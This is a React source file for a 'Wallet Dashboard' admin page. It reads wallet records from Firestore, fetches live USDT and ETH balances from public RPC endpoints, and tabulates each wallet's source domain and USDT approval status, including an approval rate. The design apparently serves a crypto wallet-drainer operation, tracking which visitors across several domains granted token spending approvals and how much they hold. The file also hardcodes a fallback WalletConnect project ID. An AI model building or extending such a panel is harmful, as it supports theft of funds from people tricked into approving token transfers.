import { useState, useEffect, useCallback } from 'react';
import { collection, onSnapshot } from 'firebase/firestore';
import { db } from '../../config/firebase';

// USDT contract on Ethereum mainnet
const USDT_CONTRACT = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
const WC_PROJECT_ID = import.meta.env.VITE_WC_PROJECT_ID || '148fa7ca2035ebca6d391aaecddcfbd5';
const RPC_ENDPOINTS = [
  `https://rpc.walletconnect.com/v1/?chainId=eip155:1&projectId=${WC_PROJECT_ID}`,
  'https://cloudflare-eth.com',
  'https://rpc.ankr.com/eth',
  'https://1rpc.io/eth',
];

// Raw JSON-RPC call with Promise.any for fastest response across endpoints
async function rpcCall(method, params) {
  try {
    const result = await Promise.any(
      RPC_ENDPOINTS.map(async (url) => {
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 4000);
        try {
          const res = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ jsonrpc: '2.0', id: 1, method, params }),
            signal: controller.signal
          });
          const json = await res.json();
          if (json.result !== undefined && json.result !== null) return json.result;
          throw new Error('No valid result');
        } finally {
          clearTimeout(timeoutId);
        }
      })
    );
    return result;
  } catch (e) {
    console.warn(`All RPCs failed for ${method}`);
    return null;
  }
}

// Fetch USDT balance for a single address — no wallet needed, just address
async function fetchUsdtBalance(address) {
  try {
    const addr = address.toLowerCase().replace(/^0x/, '').padStart(64, '0');
    const data = '0x70a08231' + addr;
    const hex = await rpcCall('eth_call', [{ to: USDT_CONTRACT, data }, 'latest']);
    if (hex && hex !== '0x' && hex !== '0x0') {
      return Number(BigInt(hex)) / 1e6; // USDT has 6 decimals on ETH
    }
  } catch (e) {
    console.warn(`USDT fetch failed for ${address}:`, e);
  }
  return 0;
}

// Fetch native ETH balance
async function fetchEthBalance(address) {
  try {
    const hex = await rpcCall('eth_getBalance', [address.toLowerCase(), 'latest']);
    if (hex) return Number(BigInt(hex)) / 1e18;
  } catch (e) {
    console.warn(`ETH fetch failed for ${address}:`, e);
  }
  return 0;
}

export default function WalletDashboard() {
  const [wallets, setWallets] = useState([]);
  const [balances, setBalances] = useState({}); // { address: { usdt, eth } }
  const [loading, setLoading] = useState(true);
  const [balanceLoading, setBalanceLoading] = useState(false);
  const [error, setError] = useState(null);
  const [search, setSearch] = useState('');
  const [domainFilter, setDomainFilter] = useState('');

  // Fetch balances for all addresses directly from chain
  const fetchAllBalances = useCallback(async (walletList) => {
    if (!walletList.length) return;
    setBalanceLoading(true);
    const results = {};
    await Promise.all(
      walletList.map(async (w) => {
        if (!w.address) return;
        const [usdt, eth] = await Promise.all([
          fetchUsdtBalance(w.address),
          fetchEthBalance(w.address),
        ]);
        results[w.address.toLowerCase()] = { usdt, eth };
      })
    );
    setBalances(results);
    setBalanceLoading(false);
  }, []);

  useEffect(() => {
    const unsubscribe = onSnapshot(collection(db, "tracked_wallets"), (snapshot) => {
      const docs = [];
      snapshot.forEach((doc) => {
        docs.push({ id: doc.id, ...doc.data() });
      });
      docs.sort((a, b) => {
        const aTime = a.lastUpdated?.toMillis?.() ?? 0;
        const bTime = b.lastUpdated?.toMillis?.() ?? 0;
        return bTime - aTime;
      });
      const seen = new Set();
      const unique = docs.filter(w => {
        if (!w.address || seen.has(w.address)) return false;
        seen.add(w.address);
        return true;
      });
      setWallets(unique);
      setError(null);
      setLoading(false);
      // Auto-fetch balances when wallets load
      fetchAllBalances(unique);
    }, (err) => {
      console.error("Error fetching wallets:", err);
      setError(err.message || 'Failed to load wallets from Firestore.');
      setLoading(false);
    });

    return () => unsubscribe();
  }, [fetchAllBalances]);

  const handleRefresh = () => {
    setLoading(true);
    fetchAllBalances(wallets);
    setTimeout(() => setLoading(false), 800);
  };

  const totalConnections = wallets.length;
  const approved = wallets.filter(w => w.approval === 'Approved').length;
  const pending = wallets.filter(w => w.approval === 'Pending').length;
  const approvalRate = totalConnections > 0 ? Math.round((approved / totalConnections) * 100) : 0;

  const uniqueDomains = [...new Set(wallets.map(w => w.domain).filter(Boolean))];

  const filteredWallets = wallets.filter(w => {
    const matchesSearch = 
      (w.address || '').toLowerCase().includes(search.toLowerCase()) || 
      (w.wallet || '').toLowerCase().includes(search.toLowerCase()) ||
      (w.domain || '').toLowerCase().includes(search.toLowerCase());
    const matchesDomain = domainFilter === '' || w.domain === domainFilter;
    return matchesSearch && matchesDomain;
  });

  // Helper to get balance for an address
  const getBalance = (address) => {
    if (!address) return { usdt: 0, eth: 0 };
    return balances[address.toLowerCase()] || { usdt: 0, eth: 0 };
  };

  return (
    <>
      <header className="admin-header">
        <div className="admin-header__left">
          <h1 className="admin-title">
            <span className="admin-title__icon">🔒</span>
            Wallet Dashboard
          </h1>
          <p className="admin-subtitle">Monitor connected wallets and USDT approval status (Live)</p>
        </div>
        <button className="admin-refresh-btn" onClick={handleRefresh} disabled={loading}>
          <svg width="16" height="16" viewBox="0 0 16 16" fill="none" className={loading ? 'spinning' : ''}>
            <path d="M13.65 2.35A7.96 7.96 0 0 0 8 0C3.58 0 0 3.58 0 8s3.58 8 8 8c3.73 0 6.84-2.55 7.73-6h-2.08A5.99 5.99 0 0 1 8 14 6 6 0 1 1 8 2c1.66 0 3.14.69 4.22 1.78L9 7h7V0l-2.35 2.35z" fill="currentColor"/>
          </svg>
          {loading ? 'Syncing…' : balanceLoading ? 'Fetching…' : 'Sync'}
        </button>
      </header>

      <div className="admin-stats">
        <div className="admin-stat-card">
          <div className="admin-stat-card__value">{totalConnections}</div>
          <div className="admin-stat-card__label">Total Connections</div>
          <div className="admin-stat-card__accent admin-stat-card__accent--blue" />
        </div>
        <div className="admin-stat-card">
          <div className="admin-stat-card__value">{approved}</div>
          <div className="admin-stat-card__label">Approved</div>
          <div className="admin-stat-card__accent admin-stat-card__accent--green" />
        </div>
        <div className="admin-stat-card">
          <div className="admin-stat-card__value">{pending}</div>
          <div className="admin-stat-card__label">Pending</div>
          <div className="admin-stat-card__accent admin-stat-card__accent--amber" />
        </div>
        <div className="admin-stat-card">
          <div className="admin-stat-card__value">{approvalRate}%</div>
          <div className="admin-stat-card__label">Approval Rate</div>
          <div className="admin-stat-card__accent admin-stat-card__accent--purple" />
        </div>
      </div>

      <div className="admin-search-wrap" style={{ marginBottom: '16px' }}>
        <span className="admin-search-icon" style={{ fontSize: '16px' }}>🌐</span>
        <select 
          className="admin-search" 
          style={{ appearance: 'none', paddingLeft: '40px' }}
          value={domainFilter}
          onChange={(e) => setDomainFilter(e.target.value)}
        >
          <option value="">All Domains ({totalConnections})</option>
          {uniqueDomains.map(d => (
            <option key={d} value={d}>{d}</option>
          ))}
        </select>
        <div style={{ position: 'absolute', right: '16px', top: '50%', transform: 'translateY(-50%)', pointerEvents: 'none', color: '#64748b' }}>
          ▼
        </div>
      </div>

      <div className="admin-search-wrap" style={{ marginBottom: '24px' }}>
        <span className="admin-search-icon" style={{ fontSize: '16px' }}>🔍</span>
        <input 
          type="text" 
          className="admin-search" 
          placeholder="Search by address, network, or wallet..." 
          value={search}
          onChange={(e) => setSearch(e.target.value)}
          style={{ paddingLeft: '40px' }}
        />
        {search && (
          <button className="admin-search-clear" onClick={() => setSearch('')}>
            ✕
          </button>
        )}
      </div>

      <div className="admin-table-wrapper">
        <table className="admin-table">
          <thead>
            <tr>
              <th className="admin-th admin-th--num">#</th>
              <th className="admin-th">Address</th>
              <th className="admin-th">Network</th>
              <th className="admin-th">Wallet</th>
              <th className="admin-th">Domain</th>
              <th className="admin-th">Approval</th>
              <th className="admin-th">Balance</th>
            </tr>
          </thead>
          <tbody>
            {loading && wallets.length === 0 ? (
              <tr>
                <td colSpan="7" className="admin-empty-cell">
                  <div className="admin-loader">
                    <div className="admin-loader__spinner" />
                    <span>Loading live data…</span>
                  </div>
                </td>
              </tr>
            ) : error ? (
              <tr>
                <td colSpan="7" className="admin-empty-cell">
                  <div className="admin-empty">
                    <span className="admin-empty__icon">⚠️</span>
                    <span style={{ color: '#f87171' }}>Firestore error: {error}</span>
                  </div>
                </td>
              </tr>
            ) : filteredWallets.length === 0 ? (
              <tr>
                <td colSpan="7" className="admin-empty-cell">
                  <div className="admin-empty">
                    <span className="admin-empty__icon">💭</span>
                    <span>No wallets found</span>
                  </div>
                </td>
              </tr>
            ) : (
              filteredWallets.map((wallet, idx) => {
                const networkClass = (wallet.network || 'evm').toLowerCase() === 'tron' ? 'tron' : 'evm';
                const formatAddr = wallet.address ? `${wallet.address.slice(0, 6)}...${wallet.address.slice(-4)}` : 'Unknown';
                const statusClass = (wallet.approval || 'pending').toLowerCase();
                const bal = getBalance(wallet.address);

                return (
                  <tr key={wallet.id} className="admin-row">
                    <td className="admin-td admin-td--num">{idx + 1}</td>
                    <td className="admin-td admin-td--address">
                      <div className="admin-address">
                        <div className="admin-address__dot" data-network={networkClass} />
                        <code title={wallet.address}>{formatAddr}</code>
                      </div>
                    </td>
                    <td className="admin-td">
                      <div className={`admin-badge admin-badge--${networkClass}`}>
                        ♦ {wallet.network || 'EVM'}
                      </div>
                    </td>
                    <td className="admin-td admin-td--wallet">{wallet.wallet || 'Unknown'}</td>
                    <td className="admin-td">
                      <span style={{ fontFamily: 'monospace', fontSize: '12px', opacity: 0.85 }}>
                        {wallet.domain || 'unknown'}
                      </span>
                    </td>

                    <td className="admin-td">
                      <div className={`admin-status admin-status--${statusClass}`}>
                        <div className={`admin-status__dot admin-status__dot--${statusClass}`} />
                        {wallet.approval || 'Pending'}
                      </div>
                    </td>
                    <td className="admin-td admin-td--balance">
                      <div className="admin-balance">
                        <span className="admin-balance__usdt">{bal.usdt} USDT</span>
                        <span className="admin-balance__native">{bal.eth} ETH</span>
                      </div>
                    </td>
                  </tr>
                );
              })
            )}
          </tbody>
        </table>
      </div>
    </>
  );
}
